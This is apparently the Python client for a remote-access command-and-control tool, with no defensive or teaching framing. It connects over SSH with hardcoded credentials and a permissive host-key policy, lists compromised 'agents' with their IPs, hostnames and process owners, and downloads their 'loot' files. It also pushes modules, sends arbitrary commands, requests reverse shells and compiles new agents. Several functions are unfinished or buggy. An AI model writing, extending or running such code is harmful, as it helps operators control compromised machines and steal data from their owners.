import paramiko
import misc

class AgentStruct():
    def __init__(self, id, ip, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.ip = ip
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # To read from channel:
        #   recv(self, nbytes)
        # To write to channel:
        #   sendall(self, s)

        # Initiate the connection
        self.channel.sendall("0")
        out = self.channel.recv(5)
        print(out)
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.channel.recv(8196).decode()
            if out != "fi":
                out = out.split("\n")
                appnd = AgentStruct(out[0],out[1],out[2],out[3],out[4],out[5])
                self.agents.append(appnd)
                self.channel.sendall('0')

        print("[+] Successfully gathered agent information")

    def download_loot(self, agent_id):
        filepath = "."#misc.getSavePath()
        cnt=0
        data = b""

        if not filepath:
            return 1

        self.channel.sendall("21|"+agent_id)
        print("Sent request")
        num = int(self.channel.recv(10).decode())
        print("Got number %d " % num)
        for i in range(num):
            print("Sending ready")
            self.channel.sendall("rd")
            print("Getting name")
            name = self.channel.recv(256).decode()
            print("Got name " + name)
            self.channel.sendall("ok")
            print("sent ok")
            size = int(self.channel.recv(10).decode())
            print("Got size %d" % size)
            self.channel.sendall("ok")
            print("Sent OK")
            if(size > 8196 * cnt):
                print("inloop")
                data += self.channel.recv(size)
                print("Got data")
                cnt +=1
                print("inc")
                self.channel.sendall("ok")
                print("Sent ok")
            

            file = open(filepath + "/" + name, "wb")
            file.write(data)

        self.channel.sendall("cm")    

    def upload_file(self, agent_id, file):
        self.channel.sendall("22|" + file.filename)
    
    def do_download(self, agent_id, path):
        print("[ ] Doing Download...")
        self.channel.sendall("23|%s:%s" % (agent_id, path))

    def push_module(self, agent_id, filestruct):
        print("[ ] Pushing module file to agent %s..." % agent_id)
        self.channel.sendall("24|%s:%s" % (agent_id, filestruct.filename))

    def send_command(self, agent_id, command):
        print("[ ] Sending command to agent...")
        self.channel.sendall("25|%s:%s" % (agent_id, command))

    def req_revsh(self, agent_id, port):
        print("[ ] Sending Reverse Shell Request...")
        self.channel.sendall("26|%s:%s" % (agent_id, port))

    def compile_agent(self, ip, port):
        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
        self.channel.sendall("27|%s:%s" % (ip, port))
        fileData = ""
        misc.save_file(fileData)

    def register_agent(self, name, password):
        print("[ ] Registering agent with server...")
        self.channel.sendall('28|%s:%s' % (name, password))

    
